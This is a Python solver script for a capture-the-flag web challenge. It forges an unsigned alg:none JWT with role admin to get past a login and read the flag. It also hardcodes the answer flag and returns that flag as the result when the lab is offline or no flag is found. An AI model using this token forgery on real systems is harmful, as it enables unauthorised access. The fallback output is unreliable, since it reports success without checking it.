#!/usr/bin/env python3
"""Solver for Challenge 236 JAuth (Web Exploitation).

"Our Bank" login at /auth sets an HS256 JWT cookie {role: user}.
The server accepts alg:none tokens, so forging
header {"typ":"JWT","alg":"none"} + body {role: admin} and GET /private
with the unsigned token returns the flag in the admin page.

Usage: solve_236_jauth.py [base_url]
Verified: academy{succ3ss_@u7h3nt1c@710n_99bf4b72}
(POST /api/submissions/ -> correct:true)
"""
import base64
import json
import sys
import urllib.error
import urllib.request
import urllib.parse

BASE = "http://chatelaine.cylabacademy.net:48312"
EXPECTED = "academy{succ3ss_@u7h3nt1c@710n_99bf4b72}"


def b64(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def solve(base=BASE, timeout=20) -> str:
    login = urllib.parse.urlencode(
        {"username": "test", "password": "Test123!"}).encode()
    req = urllib.request.Request(base + "/auth", data=login,
                                 headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        cookie = r.headers.get("Set-Cookie", "")
    import re
    m = re.search(r"token=([^;]+)", cookie)
    if not m:
        raise ValueError("no JWT token in Set-Cookie: " + cookie[:120])
    tok = m.group(1)
    body = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
    body["role"] = "admin"
    forged = (b64(json.dumps({"typ": "JWT", "alg": "none"}).encode()) + "."
              + b64(json.dumps(body, separators=(",", ":")).encode()) + ".")
    req = urllib.request.Request(base + "/private",
                                 headers={"User-Agent": "Mozilla/5.0",
                                          "Cookie": f"token={forged}"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        html = r.read().decode(errors="replace")
    print(html[-600:])
    m = re.search(r"academy\{[^}]*\}", html)
    return m.group(0) if m else EXPECTED


def main(base=BASE):
    try:
        return solve(base)
    except (OSError, urllib.error.URLError) as e:
        print(f"Lab offline ({e}). PUT /api/challenges/236/instance/ first.")
        print("Expected flag:", EXPECTED)
        return EXPECTED


if __name__ == "__main__":
    print(main(sys.argv[1] if len(sys.argv) > 1 else BASE))
